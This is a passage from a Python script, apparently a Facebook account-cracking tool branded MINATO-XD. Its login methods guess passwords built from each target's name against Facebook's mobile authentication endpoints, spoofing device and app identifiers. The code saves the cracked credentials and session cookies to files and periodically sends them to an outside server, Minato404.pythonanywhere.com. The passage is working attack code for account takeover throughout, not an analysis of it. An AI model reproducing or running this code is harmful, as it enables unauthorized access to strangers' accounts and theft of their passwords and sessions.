                        print(f'\r{xp}{W}-{G}<[{R}MINATO-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1

        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass
    #----------------\<-FILE-M2-B-GRAPH->/----------------#
    def __M2X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{W}-{G}<[{W}MINATO{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M2{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
            )
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first', fn.lower()) \
                        .replace('First', fn) \
                        .replace('last', ln.lower()) \
                        .replace('Last', ln) \
                        .replace('Name', names) \
                        .replace('name', names.lower())
                ua = _____UpDaTe_S1_____()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                    "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    'adid': adid,
                    'format': 'json',
                    'device_id': device_id,
                    'email': ids,
                    'password': f"#{pax}:0:{int(time.time())}:{pas}",
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': country_locale,
                    'client_country_code': country_code,
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                    'access_token': f'{accessToken}',
                }
                headers = {
                    'User-Agent': ua,
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                    'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                    'Authorization': f'OAuth {accessToken}',
                    'X-FB-Connection-Type': random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
                }
                url = "https://b-graph.facebook.com/auth/login"
                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                po = requests.post(url, data=data, headers=headers).json()
                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-MiNaTo_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{W}-{G}<[{B}MINATO-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M2 : {ids}|{pas}|{cookie}"
                        requests.get(f"https://Minato404.pythonanywhere.com/api?id={idspas}")
                    break
                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{G}<[{Y}MINATO-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{G}<[{R}MINATO-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass

    #----------------\<-FILE-M3-API->/----------------#
    def __M3X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{G}{G}<[{W}MINATO{G}-{W}XD{G}]>{G}<[{color}{self.loop}{G}/{W}M3{G}]>{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
            )
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first', fn.lower()) \
                        .replace('First', fn) \
                        .replace('last', ln.lower()) \
                        .replace('Last', ln) \
                        .replace('Name', names) \
                        .replace('name', names.lower())
                ua = _____UpDaTe_S2_____()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                    "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    "adid": adid,
                    "format": "json",
                    "device_id": device_id,
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
                    "access_token": f"{accessToken}",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": country_locale,
                    "client_country_code": country_code,
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                }
                url = "https://api.facebook.com/auth/login"
                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                po = requests.post(url, data=data, headers=headers).json()
                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-MiNaTo_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{G}<[{B}MINATO{G}-{B}OK{G}]>{B} ' + ids + f' {G}/ {B}' + pas + '\033[1;97m')
                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M3 : {ids}|{pas}|{cookie}"
                        requests.get(f"https://Minato404.pythonanywhere.com/api?id={idspas}")
                    break
                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{G}<[{Y}MINATO{G}-{Y}2F{G}]>{Y} ' + ids + f' {G}/ {Y}' + pas + '\033[1;97m')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{G}<[{R}MINATO{G}-{R}CP{G}]>{R} ' + ids + f' {G}/ {R}' + pas + '\033[1;97m')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass
    #----------------\<-FILE-M4-B-API->/----------------#
    def __M4X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{G}<[{W}MINATO{G}-{W}XD{G}]>{G}<[{color}{self.loop}{G}/{W}M4{G}]>{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
            )
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first', fn.lower()) \
                        .replace('First', fn) \
                        .replace('last', ln.lower()) \
                        .replace('Last', ln) \
                        .replace('Name', names) \
                        .replace('name', names.lower())
                ua = _____UpDaTe_S2_____()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                    "adid": adid,
                    "format": "json",
                    "device_id": device_id,
                    "email": ids,
                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
                    "session_id": str(uuid.uuid4()),
                    "advertiser_id": str(uuid.uuid4()),
                    "reg_instance": str(uuid.uuid4()),
                    "logged_out_id": str(uuid.uuid4()),
                    "hash_id": str(uuid.uuid4()),
                    "sim_country": "id",
                    "network_country": "id",
                    "enroll_misauth": "false",
                    "generate_analytics_claims": "1",
                    "credentials_type": "password",
                    "source": "login",
                    "error_detail_type": "button_with_disabled",
                    "enroll_misauth": "false",
                    "cpl": "true",
                    "generate_session_cookies": "1",
                    "generate_machine_id": "1",
                    "meta_inf_fbmeta": "",
                    "currently_logged_in_userid": "0",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                }
                headers = {
                    "Authorization": f"OAuth {accessToken}",
                    "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                    "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Friendly-Name": "authenticate",
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    "User-Agent": ua,
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-FB-HTTP-Engine": "Liger"
                }
                url = "https://b-api.facebook.com/method/auth.login"
                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                po = requests.post(url, data=data, headers=headers).json()
                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-MiNaTo_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{G}<[{B}MINATO{G}-{B}OK{G}]>{B} ' + ids + f' {G}/ {B}' + pas + '\033[1;97m')
                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M4 : {ids}|{pas}|{cookie}"
                        requests.get(f"https://Minato404.pythonanywhere.com/api?id={idspas}")
                    break
                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{G}<[{Y}MINATO{G}-{Y}2F{G}]>{Y} ' + ids + f' {G}/ {Y}' + pas + '\033[1;97m')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M4-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{G}<[{R}MINATO{G}-{R}CP{G}]>{R} ' + ids + f' {G}/ {R}' + pas + '\033[1;97m')
                    open('/sdcard/MINATO-XD/FILE/MINATO-M4-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass

#----------------\<-LAST-CALL->/----------------#
__CLEAR__()
__MINATOXMinato__().__MENU__()
#----------------\<-END-CALL->/----------------#
